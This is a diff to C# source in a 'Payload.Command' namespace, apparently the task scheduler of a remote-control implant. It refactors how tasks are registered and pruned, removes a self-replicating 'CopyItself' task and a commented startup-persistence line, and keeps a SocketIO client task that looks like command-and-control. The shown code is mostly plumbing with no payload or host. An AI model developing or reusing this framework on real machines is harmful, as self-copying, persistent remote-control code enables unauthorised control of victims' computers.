@@ -39,17 +39,21 @@ namespace Payload.Command
         }
         #endregion
         public Dictionary<Payload.Common.Config.EnumTask, TaskPack> TaskMap { get; private set; }
+        public HashSet<Payload.Common.Config.EnumTask> DieTask { get; private set; }
         public Dictionary<Payload.Common.Config.EnumTask, bool> FlagMap { get; private set; }
 
         private void Init() // Task Mapping 
         {
             FlagMap = new Dictionary<EnumTask, bool>();
-            RegisterTask();
+            TaskMap = new Dictionary<Common.Config.EnumTask, TaskPack>();
+            DieTask = new HashSet<EnumTask>();
+            //RegisterTask();
         }
 
-        private void RegisterTask()
+        public void RegisterTask()
         {
-            TaskMap = new Dictionary<Common.Config.EnumTask, TaskPack>();
+            if (TaskMap.Count > 0)
+                return;
             //TaskMap.Add(Common.Config.EnumTask.Demo, new DemorFactory().CreateTaskPack());
 
             switch (Config.Instance.AppMode)
@@ -57,8 +61,6 @@ namespace Payload.Command
                 case EnumAppMode.DEBUG:
                     goto case EnumAppMode.NONE;
                 case EnumAppMode.JACK:
-                    //TaskMap.Add(Common.Config.EnumTask.StartupSetup, new StartupSetupFactory().CreateTaskPack());
-                    TaskMap.Add(Common.Config.EnumTask.CopyItself, new CopyItselfFactory().CreateTaskPack());
                     goto case EnumAppMode.NONE;
                 case EnumAppMode.NONE:
                     TaskMap.Add(Common.Config.EnumTask.SocketIO, new SocketIOClientFactory().CreateTaskPack());
@@ -135,20 +137,31 @@ namespace Payload.Command
                 TaskPack _tp = taskPack.Value;
                 if (_tp == null)
                     continue;
-                if (_tp.Mode.Equals(EnumTaskPackMode.EXIT) && _tp.Executed)
-                {
-                    new StartProcessCommand().Execute();
-                    Environment.Exit(0);
-                }
-                if (_tp.Mode.Equals(EnumTaskPackMode.NONE) || !_tp.ShouldCallRun)
-                    continue;
-                if (_tp.Mode.Equals(EnumTaskPackMode.ONCE) && _tp.Executed)
+                if (!_tp.ShouldCallRun || (_tp.Mode.Equals(EnumTaskPackMode.ONCE) && _tp.Executed) )
                     continue;
                 if (_tp.Task!=null && _tp.Task.Status.Equals(TaskStatus.Running))
                     continue;
                 if (_tp.Precondition.Count > 0 && !TaskDone(_tp.Precondition))
                     continue;
+
+                if (_tp.Mode.Equals(EnumTaskPackMode.NONE))
+                {
+                    if(!DieTask.Contains(taskPack.Key))
+                        DieTask.Add(taskPack.Key);
+                    else
+                        DieTask.Remove(taskPack.Key);
+                    continue;
+                }
                 _tp.Start(taskPack.Key);
+            }
+            RemoveDieTask();
+        }
+
+        public void RemoveDieTask()
+        {
+            foreach (EnumTask dieTask in DieTask)
+            {
+                TaskMap.Remove(dieTask);
             }
         }
     }
